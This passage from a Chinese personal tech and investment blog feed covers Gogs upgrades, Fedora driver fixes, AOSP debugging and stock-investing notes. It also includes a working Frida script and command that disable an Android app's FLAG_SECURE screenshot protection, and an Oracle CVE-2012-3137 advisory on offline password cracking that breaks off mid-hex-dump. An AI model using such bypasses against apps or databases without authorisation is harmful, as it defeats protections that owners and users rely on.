<code>gogs.20220112095054.zip</code></p><h3 id="迁移配置"><a href="#迁移配置" class="headerlink" title="迁移配置"></a>迁移配置</h3><p>将 gogs.20220112095054.zip 解压，这就类似 gogs 的二进制升级了 <a href="https://gogs.io/docs/upgrade/upgrade_from_binary">https://gogs.io/docs/upgrade/upgrade_from_binary</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> gogs gogs_old<br><span class="hljs-built_in">cp</span> -R gogs_old/custom gogs<br><span class="hljs-built_in">cp</span> -R gogs_old/data gogs<br><span class="hljs-built_in">cp</span> -R gogs_old/log gogs<br></code></pre></td></tr></table></figure><p>gogs 0.13 的配置已经发生了变化，如果不修改配置执行 <code>./gogs web</code>会出现错误</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">2022/01/12 09:40:06 [ <span class="hljs-built_in">INFO</span>] Gogs 0.13.0+dev<br>2022/01/12 09:40:06 [FATAL] [<span class="hljs-built_in">..</span>.github/internal/route/install.go:75 GlobalInit()] Failed <span class="hljs-keyword">to</span> initialize ORM engine:<br>open database: failed <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span> `<span class="hljs-attribute">host</span>=127.0.0.1 <span class="hljs-attribute">user</span>=root <span class="hljs-attribute">database</span>=gogs`: dial <span class="hljs-built_in">error</span> (dial tcp 127.0.0.1:3306: connect:<span class="hljs-built_in"> connection </span>refused)<br></code></pre></td></tr></table></figure><p>看错误像是在连接 mysql 的 3306 端口，可是配置文件设置的是使用 sqlite，非常困惑。上网搜索后证实是 gogs 0.13 的配置文件的字段修改了。</p><p><img src="https://github.com/henices/pictures/raw/master/gogs1.png"></p><p>最关键的两个字段是数据库相关的 <code>DB_TYPE</code> 改为 <code>TYPE</code>， <code>PASSWD</code> 改为 <code>PASSWORD</code> 修改后 <code>custom/conf/app.ini</code> 后，执行 <code>./gogs web</code> 一切正常。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>github clone 加速</title>
    <link href="/cn/github_speed_up/"/>
    <url>/cn/github_speed_up/</url>
    
    <content type="html"><![CDATA[<p>国内因为众所周知的原因，git clone 一直很慢，最近可能状况就更糟糕了。@TeleMan 提供了一个信息，可以<br>通过修改 host 文件达到加速效果。经过测试，只要修改两条记录即可</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">199.232.69.194</span>                github.global.ssl.fastly.net<br><span class="hljs-number">140.82.113.4</span>                  github.com<br></code></pre></td></tr></table></figure><p>修改后，速度快多了，直连</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/googleprojectzero/winafl.git<br>正克隆到 <span class="hljs-string">&#x27;winafl&#x27;</span>...<br>remote: Enumerating objects: 1538, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (175/175), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (108/108), <span class="hljs-keyword">done</span>.<br>remote: Total 1538 (delta 90), reused 130 (delta 60), pack-reused 1363<br>接收对象中: 100% (1538/1538), 5.29 MiB | 765.00 KiB/s, 完成.<br>处理 delta 中: 100% (846/846), 完成.<br></code></pre></td></tr></table></figure><p>使用一段时间后发现不是太稳定，终极大法还是需要一个长长的梯子，此方法记为备用方案。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高效复盘技巧</title>
    <link href="/cn/fupangjiqiao/"/>
    <url>/cn/fupangjiqiao/</url>
    
    <content type="html"><![CDATA[<p>前些年总结的，现在看起来，过于复杂了，可能做短线的会有需求。</p><p><img src="https://github.com/henices/pictures/raw/master/webwxgetmsgimg.jpeg" alt="image"></p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本面需要关注的点</title>
    <link href="/cn/fundamental/"/>
    <url>/cn/fundamental/</url>
    
    <content type="html"><![CDATA[<p>准备多写点东西，内容将不在局限于网络安全。</p><p>不得不说搞金融的这些人很厉害，各种玩法坑死大家了。<br>除了一般需要关注的点，还需要关注几个地方，其实这些点在某些情况下比PE，ROE 啥的都重要：</p><ul><li>可转债 （一堆家伙喜欢套利）</li><li>配股   （散户不太喜欢配股）</li><li>融资盘 （主力不喜欢太多人做轿子）</li><li>增发   （这个情况比较复杂，增发价是比较重要的）</li><li>质押   （太高可能暴雷）</li><li>GDR   （还是套利）</li><li>商誉   （可能要计提，影响净利润）</li><li>减持   （主力不喜欢给大股东抬轿子)</li></ul><p>要了解这些情况最可靠的方法为读公告，一般情况雪球和东方财富股吧会有人讨论。</p><p><a href="https://xueqiu.com/">https://xueqiu.com/</a><br><a href="http://guba.eastmoney.com/">http://guba.eastmoney.com/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转】冯柳投资十大金句</title>
    <link href="/cn/fengliu/"/>
    <url>/cn/fengliu/</url>
    
    <content type="html"><![CDATA[<p>（一）经济的波动就像是剪羊毛，长好了就剪、剪完了再长。拿剪子的一般就是赢家，当然赢家之间也有互相剪的，所以就有大小赢家、长短赢家之分。</p><p>（二）技术分析主要是找出趋势和预期同向运动并强化的机会，价值分析则可以在反向运动但最终会被预期改变的机会上下注。</p><p>（三）各方面都完美的系统是不可能长期存在的，放弃效率和短期安全的系统往往才会是长期安全和可重复的。这不太符合人性，也就保证了系统的独特和有效性，也有利于将精力放在长期要素和战略点的思考上。</p><p>（四）涨跌都能令人坚定的才是好标的，跌令实的更实，因为价钱便宜了。涨令虚处显得确定，因为得到市场的确认和佐证了。这就是虚实结合带来的效果，如果涨几十个点就让人有想卖的感觉，那就说明虚处不足，就不太可能是好选择，最后也许连那几十个点也不容易挣到。反过来也是一样，跌了不敢重仓加的就说明实处不够，要多检讨下自己对确定性的把握能力。</p><p>（五）资产就是金钱在不同时间下的不同属性，本质就是现在的钱和未来的钱之间进行交换，买入是用现在换未来，卖出则是把未来换现在，关键要想明白未来和现在谁更值钱就好了。牛熊市就是这样的一个判断依据，当然，对极少数的优异公司来说，未来总是会强过现在的，这就是比牛熊大势更大的大势。</p><p>（六）市场在不断变化，企业也在不断变化，变化是常态，所以任何时候都要多方向的反复审视，对世界有敬畏心。这个敬畏就是要认识到事物总是在不断变化和出现意外的，所以要尽量让自己处于有保护的状态，尽量多的假设极端情况下的可靠性。</p><p>（七）当全世界都想通过股市来对抗通货膨胀的时候，也许拿着现金让其自然贬值会是更好的选择。除非你能找到明确的新增预期，否则凭什么指望别人以更高的价钱来购买已经给他人提供过保值机会的资产呢（房地产）。</p><p>（八）每个阶段的侧重点是不一样的。在高位的时候，我们要做计算题，要定量。因为一只股票涨了这么多、这么长时间，它的方向一定是没有问题的，这个时候你再去做定性研究意义不大。在低位的时候，如果你再去算账，就很容易吃大亏。它跌了这么久，那一定是方向上出了问题，你要把方向给想明白。如果能把方向证伪掉，是不需要考虑定量的问题，因为低位天然带有弹性和赔率。</p><p>（九）真正的投机应该是在价值的基础上进行的，是通过充分的价值理解后，将其在不同人群或环境下进行切换来获益。它认识到价值有主观倾向性和个性化的特点，价值不是个稳定具体的东西，也不存在用什么方法推算的公允值，因为资本以及资本后面的人是丰富不同的，他们有着不同的成本和收益预期，在各种市场环境下也会有着不同的预期因子和贴现率，而这些在乘数和复利计算的基础下就会有着巨大的差异。这也说明了为什么理性且信息充分对称的人之间也可以产生交易并实现双赢，其原因就在于他们有着不同的价值观、需求特点和满足感。</p><p>（十）长线投资很多人认为这是最容易做的，只要买进不动就可以了，其实这完全是误解。在所有的操作策略中，长线的要求最高。他需要对企业有着极为深刻的认识，对自己有着更为坚强的控制。他清楚把握企业未来数年的发展趋势，以投资的心态分享企业的成长。他的标的物是千里挑一，在这样的机会面前它不会惧怕任何亏损，不会设置除基本面外的任何止损指标。自信、尊重客观价值、不理会乃至勇于对抗市场是必备的投资品质，日常的波动在这样的前景面前是不应去考虑的。只有这样，股票才能够真正成为改变一生的东西。</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>升级 Fedora 36，遇上 Nvidia 驱动问题</title>
    <link href="/cn/Fedora36-Nvidia/"/>
    <url>/cn/Fedora36-Nvidia/</url>
    
    <content type="html"><![CDATA[<p>Fedora 36 正式版已经释出一段时间了，根据我的经验开始的一周都会有 bug，一般等一段时间再升级会更平滑一些。然而，老革命又遇上了新问题，显示出问题了启动不起来。我已经很久没有遇上显示驱动问题了，我在很久以前就禁用了开源驱动 <code>nouveau</code>，一直都用得很好。</p><p>修改 &#x2F;etc&#x2F;default&#x2F;grub 文件，在 <code>GRUB_CMDLINE_LINUX</code> 添加下面参数</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;... rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1&quot;</span><br></code></pre></td></tr></table></figure><p>重新生成 grub 文件， <code>sudo grub2-mkconfig -o /boot/grub2/grub.cfg</code>，但是在升级 Fedora 36 后似乎没有起作用。诡异的是 Fedora 35 的内核却可以正常工作，首先怀疑的是 nvidia 驱动可能没有安装对。执行下面命令行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf reinstall xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64<br>sudo reboot<br></code></pre></td></tr></table></figure><p>可惜没有解决问题，上网找资料看看 Fedora 36 有没什么特殊的地方。安装 Nvidia 驱动网上有这篇文章说的详细<br><a href="https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/">https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/</a><br>仔细拜读了一下，还是没有发现啥问题，驱动也重新安装了啊，开始怀疑是新版 Nvidia 驱动的问题</p><p><code>sudo dnf search xorg-x11-drv-nvidia</code> 可以查看所有的驱动，<code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> 不知道到底需要安装哪个版本的驱动。😭</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs subunit">xorg-x11-drv-nvidia.x86_64 : NVIDIA&#x27;s proprietary display driver for NVIDIA graphic cards<br>=========================================================================== 名称 和 概况 匹配：xorg-x11-drv-nvidia<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-cuda.x86_64 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-devel.i686 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx kernel module source code<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-libs.i686 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-340</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-devel.i686 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx kernel module source code<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-libs.i686 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-390</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-devel.i686 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx kernel module source code<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-libs.i686 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br>xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia<span class="hljs-string">-470</span>xx<br></code></pre></td></tr></table></figure><p>可是仔细一琢磨， Fedora 35 Nvidia 驱动不是工作正常吗，可以上去看看用的是哪个版本的驱动，执行命令 <code>nvidia-settings</code>,在 System Information 中发现使用的就是最新版本的驱动 <strong>510.68.02</strong>，看样子最新版本的驱动也没有问题，一下陷入了困境。😰</p><p>没啥好办法，还是 Google 搜索一下，结果发现了一个链接在讨论这个问题，和我遇上的现象一样，作者最终解决了问题<br><a href="https://ask.fedoraproject.org/t/fedora-linux-kernel-update-breaks-nvidia-driver/21954/11">Fedora Linux kernel update breaks NVIDIA driver</a></p><p>原来是旧版的驱动没有卸载干净，参考 <a href="https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver">https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver</a><br>驱动卸载 Nvidia 驱动需要使用命令 <code>dnf remove xorg-x11-drv-nvidia\*</code></p><p>按照下面的命令操作了一遍，重启系统，熟悉的登录界面终于又出现了。😄</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf remove xorg-x11-drv-nouveau<br>sudo dnf remove xorg-x11-drv-nvidia\*<br>sudo dnf install xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64<br>sudo reboot<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fedora31 的几个变化</title>
    <link href="/cn/Fedora31/"/>
    <url>/cn/Fedora31/</url>
    
    <content type="html"><![CDATA[<h2 id="1-默认启用-Cgroups-V2"><a href="#1-默认启用-Cgroups-V2" class="headerlink" title="1. 默认启用 Cgroups V2"></a>1. 默认启用 Cgroups V2</h2><p>nozuonodie， 升级到 Fedora 31 后， CgroupsV2 已经默认开启，理由是原来不是默认开启没人用，现在让 Fedora 用户先当当小白鼠，<br>于是 Docker 就倒下了。<a href="http://t.cn/Ai1sI5LH">http://t.cn/Ai1sI5LH</a>   grub2 配置文件 &#x2F;etc&#x2F;default&#x2F;grub， 内核参数添加 systemd.unified_cgroup_hierarchy&#x3D;0<br>可以重新开启  CgroupsV1 ​​​​</p><h2 id="2-默认的-Python-为-Python3"><a href="#2-默认的-Python-为-Python3" class="headerlink" title="2. 默认的 Python 为 Python3"></a>2. 默认的 Python 为 Python3</h2><p><a href="https://fedoraproject.org/wiki/Changes/Python_means_Python3">https://fedoraproject.org/wiki/Changes/Python_means_Python3</a></p><p>唉，不得不说 Fedora 这次有点太激进了， 搞得我编译 chromium 又出问题了。 要换回去有个歪招</p><p><code>ln -s /usr/bin/python2 /usr/local/bin/python</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恢复 Android App 的截屏功能</title>
    <link href="/cn/disable_security_flags/"/>
    <url>/cn/disable_security_flags/</url>
    
    <content type="html"><![CDATA[<p>今天遇上某 App 禁止截屏，其实就是使用了下面这段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">getWindow().setFlags(LayoutParams.FLAG_SECURE, LayoutParams.FLAG_SECURE);<br></code></pre></td></tr></table></figure><p>使用 frida 脚本可以绕过绕过这个限制 （使用 frida 需要将手机 root）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>   <span class="hljs-comment">// https://developer.android.com/reference/android/view/WindowManager.LayoutParams.html#FLAG_SECURE</span><br>   <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">FLAG_SECURE</span> = <span class="hljs-number">0x2000</span>;<br>   <span class="hljs-keyword">var</span> <span class="hljs-title class_">Window</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.view.Window&quot;</span>);<br>   <span class="hljs-keyword">var</span> setFlags = <span class="hljs-title class_">Window</span>.<span class="hljs-property">setFlags</span>;  <span class="hljs-comment">//.overload(&quot;int&quot;, &quot;int&quot;)</span><br><br>   setFlags.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">flags, mask</span>) &#123;<br>       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Disabling FLAG_SECURE...&quot;</span>);<br>       flags &amp;= ~<span class="hljs-variable constant_">FLAG_SECURE</span>;<br>       setFlags.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, flags, mask);<br>       <span class="hljs-comment">// Since setFlags returns void, we don&#x27;t need to return anything</span><br>   &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>执行 frida 命令 <code>frida -U -l disable.js -n com.apps.android --no-pause</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> frida -U -l disable.js -n com.apps.android --<span class="hljs-keyword">no</span>-pause<br><br>[Pixel <span class="hljs-number">2</span>::com.apps.android]-&gt;<br>[Pixel <span class="hljs-number">2</span>::com.apps.android]-&gt;<br>[Pixel <span class="hljs-number">2</span>::com.apps.android]-&gt; Disabling FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br><span class="hljs-function"><span class="hljs-title">Disabling</span></span> FLAG_SECURE...<br></code></pre></td></tr></table></figure><p>值得注意的是，这里使用了 <code>-n</code> 参数， attach 到目标进程，要不 App 会自动重启。看到输出调试信息后，<br>就可以正常截屏了。</p><h3 id="使用-objection"><a href="#使用-objection" class="headerlink" title="使用 objection"></a>使用 objection</h3><p>objection「2」有此功能，执行下面命令即可： <code>android ui FLAG_SECURE false</code>  但是我测试失败了。</p><h3 id="截屏小技巧-（lzx）"><a href="#截屏小技巧-（lzx）" class="headerlink" title="截屏小技巧 （lzx）"></a>截屏小技巧 （lzx）</h3><p>Android 截屏，可以使用一个快速的技巧  <code>adb exec-out screencap -p &gt; test.png</code></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li>[1] <a href="https://bhamza.me/2019/11/03/Android-Frida-hooking-disabling-FLAG-SECURE.html">https://bhamza.me/2019/11/03/Android-Frida-hooking-disabling-FLAG-SECURE.html</a></li><li>[2] <a href="https://github.com/sensepost/objection">https://github.com/sensepost/objection</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>调试AOSP Java 代码</title>
    <link href="/cn/debug_aosp_java_code/"/>
    <url>/cn/debug_aosp_java_code/</url>
    
    <content type="html"><![CDATA[<p>下载 Android 源代码，编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">source</span> build/envsetup.sh<br>$ lunch<br>$ make<br>$ mmm development/tools/idegen/<br>$ ./development/tools/idegen/idegen.sh<br></code></pre></td></tr></table></figure><p>运行后将生成下面几个文件</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">android<span class="hljs-selector-class">.ipr</span> (IntelliJ / Android Studio)<br>android<span class="hljs-selector-class">.iml</span> (IntelliJ / Android Studio)<br><span class="hljs-selector-class">.classpath</span>  (Eclipse)<br></code></pre></td></tr></table></figure><ol><li>在Android Studio 中导入 android.ipr</li></ol><p>File -&gt; Open 选择 android.ipr, 导入后可以Android Studio 中浏览AOSP 源码</p><ol start="2"><li>设置远程调试配置文件</li></ol><p>Run -&gt; Edit Configuration 点击左上角的 + 类型选择 Remote</p><ol start="3"><li>Attack 到需要调试的进程</li></ol><p>这里有两种方法，一是使用SDK 提供的 Monitor 二是使用 Android Studio 自带的<br>Attach debugger to Android Process 按钮。 </p><p>连接成功后将看到 Connected to the target VM</p><ol start="4"><li>设置断点</li></ol><p>设置断点很简单，用鼠标点击源码文件的左边栏，看见红色圆点说明就已经设置成功了。也<br>可以使用Ctrl + F8 的快捷键。</p><ol start="5"><li>运行程序，触发断点</li></ol><p>需要注意的是在调试过程中会出现源码对不上的情况，需要自己选择正确的源码。关于哪些<br>进程可以调试的问题，上篇已经有记录，这里就不在说了。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li>AOSP Sources in the IDE<br><a href="https://newcircle.com/s/post/1720/aosp_sources_in_the_ide">https://newcircle.com/s/post/1720/aosp_sources_in_the_ide</a></li><li>Debugging AOSP Platform code with Android Studio - Part I - Java Debugger<br><a href="http://ronubo.blogspot.sg/2016/01/debugging-aosp-platform-code-with.html">http://ronubo.blogspot.sg/2016/01/debugging-aosp-platform-code-with.html</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)</title>
    <link href="/cn/cve-2012-3137/"/>
    <url>/cn/cve-2012-3137/</url>
    
    <content type="html"><![CDATA[<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs subunit">NSFOCUS ID:    20847<br>BUGTRAQ ID:    55651<br>CVE ID:        CVE<span class="hljs-string">-2012</span><span class="hljs-string">-3137</span><br>远程漏洞：      是<br>本地漏洞：      是<br>漏洞类型：<br>漏洞影响：      远程攻击者可以密码进行离线密码暴力破解<br>危险指数：      高<br>创建时间：      2012<span class="hljs-string">-9</span><span class="hljs-string">-27</span><br>更新时间：<br>攻击代码：      无<br><br>跟踪工程师：    zz<br></code></pre></td></tr></table></figure><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述:"></a>漏洞概述:</h2><p>Oracle是一款广泛被使用的商业数据库。</p><p>Oracle O5LOGON认证协议存在漏洞，这个漏洞可以使攻击者离线暴力破解Oracle数据库密码，<br>从而访问受保护的Oracle数据库中的数据。要利用这个漏洞攻击者只需要知道一个合法的<br>数据库用户名和一个正确的数据库名(SID)，不需要使用中间人攻击。</p><p>Martinez Fayo 在2010年5月向Oracle报告了这个问题，Oracle在2011年的中期通过patch<br> set 11.2.0.3修复了这个漏洞，使用了新版本的协议。但是Oracle没有在 11.1和11.2 中<br>修复这个问题，因此这些版本仍然存在漏洞。</p><p>由于漏洞发生在认证阶段的早期，获取需要的数据后马上断开连接，不会在Oracle数据库<br>里留下登录日志，因此这个漏洞被称为 “stealth password cracking vulnerability”</p><p>细节：</p><p>O5LOGON 过程</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino">         send username<br><span class="hljs-built_in">Client</span> -----------------------------&gt; <span class="hljs-built_in">Server</span><br><br>         AUTH_SESSKEY  AUTH_VFR_DATA<br><span class="hljs-built_in">Client</span> &lt;----------------------------  <span class="hljs-built_in">Server</span><br><br>         AUTH_SESSKEY  AUTH_PASSWORD<br>Clinet -----------------------------&gt; <span class="hljs-built_in">Server</span><br></code></pre></td></tr></table></figure><p>和这个漏洞相关的两个报文，包含了需要的信息, 如下：</p><p>(1) Server -&gt; client</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000</span>   <span class="hljs-number">00</span> f8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">06</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................<br><span class="hljs-attribute">0010</span>   <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">53</span> <span 